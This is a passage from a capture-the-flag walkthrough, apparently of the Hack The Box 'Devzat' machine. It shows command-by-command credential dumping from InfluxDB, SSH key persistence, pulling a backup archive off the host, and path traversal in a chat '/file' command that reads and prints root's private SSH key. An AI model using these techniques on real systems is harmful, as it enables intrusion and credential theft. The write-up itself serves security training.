[devzat] Insert query (exit to change db): SELECT * FROM "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Users found:

| USERNAME | PASSWORD |
| --- | --- |
| wilhelm | WillyWonka2021 |
| catherine | woBeeYareedahc7Oogeephies7Aiseci |
| charles | RoyalQueenBee$ |

Let’s try login as Catherine’s user using her password found on InfluxDB service.

```bash
patrick@devzat:~/.ssh$ su catherine
Password: 
catherine@devzat:/home/patrick/.ssh$ id
uid=1001(catherine) gid=1001(catherine) groups=1001(catherine)
```

We were able to escalate our privilege for Catherine’s user. Now, let’s improve our shell in order to get a better permanent access.

We’ve copied our public key into the authorized_keys’ file of Catherine’s user and log into via SSH.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ ssh catherine@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 30 Jan 2022 11:45:08 PM UTC

  System load:  0.0               Processes:                249
  Usage of /:   56.0% of 7.81GB   Users logged in:          1
  Memory usage: 39%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118

107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

catherine@devzat:~$
```

Now, let’s try to download the devzat’s backup file.

On the host we’ve set up a python HTTP server.

```bash
catherine@devzat:/var/backups$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.10.16.31 - - [30/Jan/2022 23:49:56] "GET /devzat-dev.zip HTTP/1.1" 200 -
```

And our local machine we’ve downloaded the file.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ wget http://devzat.htb:9090/devzat-dev.zip
--2022-01-30 20:01:13--  http://devzat.htb:9090/devzat-dev.zip
Resolving devzat.htb (devzat.htb)... 10.10.11.118
Connecting to devzat.htb (devzat.htb)|10.10.11.118|:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28297 (28K) [application/zip]
Saving to: ‘devzat-dev.zip’

devzat-dev.zip          100%[==============================>]  27.63K  50.4KB/s    in 0.5s    

2022-01-30 20:01:14 (50.4 KB/s) - ‘devzat-dev.zip’ saved [28297/28297]
```

Into the file `commands.go` we’ve found the password.

```bash
func fileCommand(u *user, args []string) {
        if len(args) < 1 {
                u.system("Please provide file to print and the password")
                return
        }

        if len(args) < 2 {
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "CeilingCatStillAThingIn2021?" {
                u.system("You did provide the wrong password")
                return
        }

        // Get CWD
        cwd, err := os.Getwd()
        if err != nil {
                u.system(err.Error())
        }
```

# Privilege Escalation

After a lot of researching, we’ve headed where we can execute SSH passing login catherine and connecting to devzat chat on local port 8443. There is a new functionality that is `/file` where we can copy and paste the content of this file. Checking the process running as root user there is the devzat chat executing as following.

```bash
root         800  0.0  1.6 852504 33948 ?        Ssl  Jan30   0:03 /usr/lib/snapd/snapd
root         801  0.0  0.3  16860  7780 ?        Ss   Jan30   0:00 /lib/systemd/systemd-logind
root         812  0.0  0.1   6892  3176 ?        Ss   Jan30   0:00 /bin/bash /root/images/start.sh
root         824  0.0  0.1   6812  2800 ?        Ss   Jan30   0:00 /usr/sbin/cron -f
root         836  0.0  2.3 898968 47808 ?        Ssl  Jan30   0:05 /usr/bin/containerd
root         838  0.0  0.6 1234276 14000 ?       Sl   Jan30   0:00 ./devchat
```

So, we’ve connected on local SSH service on local port 8443 and discovered the `/file` functionality. Knowing that we’ve try to copy and paste the root user private SSH key on chat as we show in red.

```bash
catherine@devzat:~$ ssh -l catherine localhost -p 8443
The authenticity of host '[localhost]:8443 ([127.0.0.1]:8443)' can't be established.
ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:8443' (ED25519) to the list of known hosts.
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM]
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM]
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM]
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM]
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
catherine: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]
catherine: /file /root/.ssh/id_rsa
[SYSTEM] You need to provide the correct password to use this function
                                                                                                                                                                                  2 minutes in
catherine: /file ../../root/.ssh/id_rsa
[SYSTEM] You need to provide the correct password to use this function
catherine: /file ../../root/root.txt
[SYSTEM] You need to provide the correct password to use this function
                                                                                                                                                                                  3 minutes in
catherine: /file /root/.ssh/id_rsa 'CeilingCatStillAThingIn2021?'
[SYSTEM] You did provide the wrong password
catherine: /file /root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/images/root/.ssh/id_rsa does not exist!
catherine: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/images/root/root.txt does not exist!
catherine: /file ../../root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```

Having the root SSH private key, it just to log into SSH as root.

```bash
─[us-dedivip-1]─[10.10.16.31]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/privesc]
└──╼ [★]$ ssh -i id_rsa root@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 31 Jan 2022 12:26:41 AM UTC

  System load:  0.08              Processes:                255
  Usage of /:   56.0% of 7.81GB   Users logged in:          2
  Memory usage: 41%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118

107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@devzat:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We’ve got root!

![Untitled](images/Untitled%209.png)